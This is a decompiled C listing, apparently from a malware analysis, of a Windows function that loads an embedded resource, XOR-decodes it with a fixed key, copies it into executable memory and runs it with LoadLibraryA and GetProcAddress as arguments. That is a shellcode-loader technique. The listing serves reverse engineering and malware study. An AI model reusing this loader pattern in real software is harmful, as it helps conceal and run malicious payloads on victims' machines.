
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Instruction at (ram,0x100010d6) overlaps instruction at (ram,0x100010d5)
    */
/* WARNING: Removing unreachable block (ram,0x100010d3) */
/* WARNING: Removing unreachable block (ram,0x100010d5) */

undefined4 FUN_10001020(void)

{
  code *pcVar1;
  code *pcVar2;
  size_t sVar3;
  HRSRC hResInfo;
  HGLOBAL hResData;
  LPVOID pvVar4;
  HANDLE hProcess;
  size_t dwSize;
  DWORD flAllocationType;
  DWORD flProtect;
  int iStack_38;
  int iStack_34;
  DWORD DStack_28;
  int iStack_10;
  
  hResInfo = FindResourceA((HMODULE)0x0,(LPCSTR)0x6c,"dat");
  if (hResInfo == (HRSRC)0x0) {
    _printf("hRes ERR!\n");
  }
  else {
    DStack_28 = SizeofResource((HMODULE)0x0,hResInfo);
    if (DStack_28 == 0) {
      _printf("size 0 err!\n");
    }
    else {
      hResData = LoadResource((HMODULE)0x0,hResInfo);
      if (hResData == (HGLOBAL)0x0) {
        _printf("load err!\n");
      }
      else {
        pvVar4 = LockResource(hResData);
        if (pvVar4 == (LPVOID)0x0) {
          _printf("locak err!\n");
        }
        else {
          func_0x10001000(10000);
                    /* WARNING: Bad instruction - Truncating control flow here */
          iStack_10 = 0;
          DRam1000e964 = DStack_28;
          pvRam1000e968 = pvVar4;
          while (sVar3 = DRam1000e964, pcVar2 = LoadLibraryA_exref, pcVar1 = GetProcAddress_exref,
                0 < (int)DStack_28) {
            if ((int)DStack_28 < 0xc1) {
              for (iStack_38 = 0; iStack_38 < (int)DStack_28; iStack_38 = iStack_38 + 1) {
                *(byte *)((int)pvRam1000e968 + iStack_10 * 0xc0 + iStack_38) =
                     *(byte *)((int)pvRam1000e968 + iStack_10 * 0xc0 + iStack_38) ^
                     (&UNK_1000b3a8)[iStack_38];
              }
              DStack_28 = 0;
            }
            else {
              for (iStack_34 = 0; iStack_34 < 0xc0; iStack_34 = iStack_34 + 1) {
                *(byte *)((int)pvRam1000e968 + iStack_10 * 0xc0 + iStack_34) =
                     *(byte *)((int)pvRam1000e968 + iStack_10 * 0xc0 + iStack_34) ^
                     (&UNK_1000b3a8)[iStack_34];
              }
              iStack_10 = iStack_10 + 1;
              DStack_28 = DStack_28 - 0xc0;
            }
          }
          flProtect = 0x40;
          flAllocationType = 0x1000;
          pvVar4 = (LPVOID)0x0;
          dwSize = DRam1000e964;
          hProcess = GetCurrentProcess();
          pcRam1000e960 = (code *)VirtualAllocEx(hProcess,pvVar4,dwSize,flAllocationType,flProtect);
          _memcpy(pcRam1000e960,pvRam1000e968,DRam1000e964);
          (*pcRam1000e960)(pcVar2,pcVar1,pcRam1000e960,sVar3);
        }
      }
    }
  }
  return 0;
}

